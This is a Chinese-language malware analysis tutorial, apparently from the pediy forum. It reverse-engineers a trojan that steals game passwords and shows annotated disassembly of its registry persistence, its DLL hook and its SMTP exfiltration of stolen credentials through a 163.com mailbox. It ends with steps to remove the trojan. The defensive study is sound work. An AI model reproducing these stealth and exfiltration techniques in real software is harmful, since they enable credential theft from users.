

# 跟踪"魔兽游戏"木马的密码发送方式

> 原文：[`www.pediy.com/kssd/pediy07/pediy7-416.htm`](https://www.pediy.com/kssd/pediy07/pediy7-416.htm)

跟踪"魔兽游戏"木马的密码发送方式  
http://skyxnet.blogdriver.com/skyxnet/1009890.html  
  
导读:   
如果您的系统不小心感染了某款木马病毒,又不幸的是游戏帐号密码或 QQ 密码已经被他人盗取.  
那么,我们在找出病毒的同时,如果从病毒中找到"种马者"的"联系信息"呢？　如果运气好的话，不仅可以找回丢失的东西，更绝的可以把这些信息交给网络警察，作为举证！！  
  
  
  
测试对象: 大陆魔兽木马生成器   
测试目的: 跟踪分析所生成的木马的感染系统过程及密码发送方式  
测试说明: 我是以测试为目的利用"木马生成器" 生成一个木马程序,共邮箱及密码是虚拟的!目的只在于如此跟踪出木马内部中的有效信息!  
  
  
病毒激活后,生成 svchsot.exe 和 locarxjh.sls ; 注意,前者与正常程序 svchost.exe 的区别,后者则是 DLL 文件! 前者采用加壳,用 PEID 侦察会  
  
导致 PEID 的内存访问异常错误而无法探测! 可采用 OD 进行手工脱壳,脱壳过程较简单,我们先来看看病毒感激活时会有那些动作...  
  
"load"="D:\\\\WINDOWS\\\\System32\\\\svchsot.exe"  
  
  
病毒首先将自己复制拷贝到%systemRoot%\\system32 目录下并命名为:svchsot.exe  
并多次写入注册表项以实现其启动自动加载的目的,如:  
HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  
HKEY\_USERS\\S-1-5-21-515967899-162531612-725345543-1003\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load  
HKEY\_CURRENT\_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load  
  
  
10001FEA     56              push esi  
10001FEB     68 04010000     push 104  
10001FF0     50              push eax  
10001FF1     FF15 2CA00010   call dword ptr ds:\[<&KERNEL32.GetSystemDirectoryA>\]     
; kernel32.GetSystemDirectoryA  
10001FF7     8D4C24 08       lea ecx,dword ptr ss:\[esp+8\]  
10001FFB     68 CCC10010     push locarxjh.1000C1CC                                  
; ASCII "\\svchsot.exe"  
10002000     51              push ecx  
10002001     FF15 18A00010   call dword ptr ds:\[<&KERNEL32.lstrcatA>\]                
; kernel32.lstrcatA  
10002007     8D5424 04       lea edx,dword ptr ss:\[esp+4\]  
1000200B     8BF0            mov esi,eax  
1000200D     52              push edx  
1000200E     68 06000200     push 20006  
10002013     6A 00           push 0  
10002015     68 9CC10010     push locarxjh.1000C19C                                  
; ASCII "Software\\Microsoft\\Windows\\CurrentVersion\\Run"  
1000201A     68 02000080     push 80000002  
1000201F     FF15 08A00010   call dword ptr ds:\[<&ADVAPI32.RegOpenKeyExA>\]           
; ADVAPI32.RegOpenKeyExA  
10002025     85C0            test eax,eax  
10002027     74 15           je short locarxjh.1000203E  
10002029     8B4424 04       mov eax,dword ptr ss:\[esp+4\]  
1000202D     50              push eax  
1000202E     FF15 04A00010   call dword ptr ds:\[<&ADVAPI32.RegCloseKey>\]             
; ADVAPI32.RegCloseKey  
  
  
10002832    68 04010000         push 104  
10002837    56                  push esi  
10002838    6A 01               push 1  
1000283A    6A 00               push 0  
1000283C    68 44C20010         push locarxjh.1000C244                              
; ASCII "load"  
10002841    51                  push ecx  
10002842    FF15 00A00010       call dword ptr ds:\[<&ADVAPI32.RegSetValueExA>\]      
; ADVAPI32.RegSetValueExA  
  
  
10002042    68 04010000      push 104  
10002047    56               push esi  
10002048    6A 01            push 1  
1000204A    6A 00            push 0  
1000204C    68 94C10010      push locarxjh.1000C194                                  
; ASCII "foxwow"  
10002051    51               push ecx  
10002052    FF15 00A00010    call dword ptr ds:\[<&ADVAPI32.RegSetValueExA>\]          
; ADVAPI32.RegSetValueExA  
  
  
在 locarxjh.sls 中导出表中含有"新魔兽.dll", 其 Function Name 为:insthook  
那么, 在 svchsot.exe 中必有调用其功能的过程...  
  
  
004015A6    3BF4            cmp esi,esp  
004015A8    E8 D3080000     call unpacked.00401E80  
004015AD    8BF4            mov esi,esp  
004015AF    68 50204200     push unpacked.00422050                                  
; ASCII "\\locarxjh.sls"  
004015B4    8D95 E0FEFFFF   lea edx,dword ptr ss:\[ebp-120\]  
004015BA    52              push edx  
004015BB    FF15 A4824200   call dword ptr ds:\[<&kernel32.lstrcat>\]                 
; kernel32.lstrcatA  
004015C1    3BF4            cmp esi,esp  
004015C3    E8 B8080000     call unpacked.00401E80  
004015C8    8985 DCFEFFFF   mov dword ptr ss:\[ebp-124\],eax  
004015CE    8D85 E0FEFFFF   lea eax,dword ptr ss:\[ebp-120\]  
004015D4    50              push eax  
004015D5    68 C4554200     push unpacked.004255C4                                  
; ASCII "D:\\WINDOWS\\System32\\locarxjh.sls"  
004015DA    E8 B1070000     call unpacked.00401D90  
004015DF    83C4 08         add esp,8  
004015E2    8BF4            mov esi,esp  
004015E4    6A 00           push 0  
004015E6    6A 00           push 0  
004015E8    6A 02           push 2  
004015EA    6A 00           push 0  
004015EC    6A 00           push 0  
004015EE    68 00000040     push 40000000  
004015F3    68 C4554200     push unpacked.004255C4                                  
; ASCII "D:\\WINDOWS\\System32\\locarxjh.sls"  
004015F8    FF15 D8824200   call dword ptr ds:\[<&kernel32.CreateFileA>\]             
; kernel32.CreateFileA  
  
  
  
...一直往下走...  
当病毒完成了复制、写注册表之后，随即激活位于%systemroot%\\system32 目录下的 svchsot.exe 进程，接着进入监控过程中...  
  
  
0040110D    50              push eax  
0040110E    6A 00           push 0  
00401110    6A 00           push 0  
00401112    FF15 F4834200   call dword ptr ds:\[4283F4\]                            ; SHELL32.ShellExecuteA  
00401118    3BF4            cmp esi,esp  
0040111A    E8 610D0000     call svchsot.00401E80  
0040111F    B8 01000000     mov eax,1  
00401124    E9 96020000     jmp svchsot.004013BF ;Nop  
  
这里修改其跳转， 让其继续往下执行，主要目的是因为我的电脑中根本没有安装“魔兽”的游戏，如果监控不到游戏的存在，当然就不存在盗  
  
取帐号、密码，继而发送出去了...  
  
  
接着往下走...  
  
004012FB    68 C4554200     push svchsot.004255C4                                   
; ASCII "D:\\WINDOWS\\System32\\locarxjh.sls"  
00401300    FF15 BC824200   call dword ptr ds:\[4282BC\]                              
; kernel32.LoadLibraryA  
00401306    3BF4            cmp esi,esp  
00401308    E8 730B0000     call svchsot.00401E80  
0040130D    A3 BC554200     mov dword ptr ds:\[4255BC\],eax  
00401312    833D BC554200 0>cmp dword ptr ds:\[4255BC\],0  
00401319    75 07           jnz short svchsot.00401322  
0040131B    33C0            xor eax,eax  
0040131D    E9 9D000000     jmp svchsot.004013BF  
00401322    8BF4            mov esi,esp  
00401324    68 1C204200     push svchsot.0042201C                                   
; ASCII "insthook"  
00401329    8B15 BC554200   mov edx,dword ptr ds:\[4255BC\]  
0040132F    52              push edx  
00401330    FF15 34834200   call dword ptr ds:\[428334\]                              
; kernel32.GetProcAddress  
00401336    3BF4            cmp esi,esp  
00401338    E8 430B0000     call svchsot.00401E80                                   
; not  
0040133D    A3 C0554200     mov dword ptr ds:\[4255C0\],eax  
00401342    8BF4            mov esi,esp  
00401344    8D85 C4FCFFFF   lea eax,dword ptr ss:\[ebp-33C\]  
0040134A    50              push eax  
0040134B    8B8D 8CFCFFFF   mov ecx,dword ptr ss:\[ebp-374\]  
00401351    51              push ecx  
00401352    FF15 C0554200   call dword ptr ds:\[4255C0\]                              
; locarxjh.insthook ; F7 traceing  
  
  
  
进入后  
  
10001000 >  A1 04F10010     mov eax,dword ptr ds:\[1000F104\]  
10001005    85C0            test eax,eax  
10001007    75 09           jnz short locarxjh.10001012  
10001009    8B4424 04       mov eax,dword ptr ss:\[esp+4\]  
1000100D    A3 04F10010     mov dword ptr ds:\[1000F104\],eax  
10001012    57              push edi  
10001013    BF 58F20010     mov edi,locarxjh.1000F258                               
; ASCII "测试@163.com"  ;看到了吗. 这就是用来传递密码的邮箱...  
10001018    83C9 FF         or ecx,FFFFFFFF  
1000101B    33C0            xor eax,eax  
1000101D    F2:AE           repne scas byte ptr es:\[edi\]  
1000101F    F7D1            not ecx  
10001021    49              dec ecx  
10001022   /0F85 B5000000   jnz locarxjh.100010DD                                   
; 跳转已经实现? 不可以让其跳走!  
10001028    8B4C24 0C       mov ecx,dword ptr ss:\[esp+C\]  
1000102C    56              push esi  
1000102D    51              push ecx  
1000102E    E8 8D050000     call locarxjh.100015C0  
;F7 进入...  
10001033    83C4 04         add esp,4  
10001036    B9 40000000     mov ecx,40  
1000103B    33C0            xor eax,eax  
1000103D    BF 00F00010     mov edi,locarxjh.1000F000                               
; ASCII "D:\\WINDOWS\\System32\\foxmir.sls"  
  
  
1000108D    8B35 30A00010   mov esi,dword ptr ds:\[<&KERNEL32.CreateThread>\]   
10001093    50              push eax  
10001094    50              push eax  
10001095    FFD6            call esi   
; kernel32.CreateThread ； 创建新线程准备发送了...  
  
  
  
跟进 1000102E 处的 CALL 后，就可以很清楚的看到这些邮箱信息， 其实，进入后，我们看到此处代码的往上处...  
  
100015C0    55              push ebp  
;进入后来到此处.... 往上看代码... 你会发现意想不到的收获...  
100015C1    8B6C24 08       mov ebp,dword ptr ss:\[esp+8\]  
100015C5    56              push esi  
100015C6    33F6            xor esi,esi  
100015C8    B9 14F10010     mov ecx,locarxjh.1000F114                             ; ASCII "Smtp.163.com"  
  
  
...这就是往上看的代码...  
  
1000151B    B8 BCF20010     mov eax,locarxjh.1000F2BC                             ; ASCII "测试@163.com"  
10001520    894C24 20       mov dword ptr ss:\[esp+20\],ecx  
10001524    8B0D 84F50010   mov ecx,dword ptr ds:\[1000F584\]  
1000152A    894424 1C       mov dword ptr ss:\[esp+1C\],eax  
1000152E    894424 14       mov dword ptr ss:\[esp+14\],eax  
10001532    8D9424 E41A0000 lea edx,dword ptr ss:\[esp+1AE4\]  
10001539    8D8424 48010000 lea eax,dword ptr ss:\[esp+148\]  
10001540    894C24 18       mov dword ptr ss:\[esp+18\],ecx  
10001544    8D4C24 0C       lea ecx,dword ptr ss:\[esp+C\]  
10001548    C74424 0C 14F10>mov dword ptr ss:\[esp+C\],locarxjh.1000F114            ; ASCII "Smtp.163.com"  
10001550    C74424 2C 20F30>mov dword ptr ss:\[esp+2C\],locarxjh.1000F320  
10001558    895424 34       mov dword ptr ss:\[esp+34\],edx  
1000155C    C74424 24 18F20>mov dword ptr ss:\[esp+24\],locarxjh.1000F218           ; ASCII "用户名"  
10001564    C74424 28 38F20>mov dword ptr ss:\[esp+28\],locarxjh.1000F238           ; ASCII "测试密码"  
1000156C    C74424 10 58F20>mov dword ptr ss:\[esp+10\],locarxjh.1000F258           ; ASCII "测试@163.com";邮箱全称  
10001574    894424 30       mov dword ptr ss:\[esp+30\],eax  
  
  
  
到此，已经可以了解到“种马者”的盗取密码时的邮箱信息了！  
  
清除此木马：  
  
可以使用您的杀毒软件进行全盘清除，清除病毒体后，系统启动时可能会提示载入该病毒无法加载的问题，其实就是在 Load 处没有清除这此值。进入以上所提示的键值清除即可！ 

 4dd466d0e1e0cc123afbe504da2462ca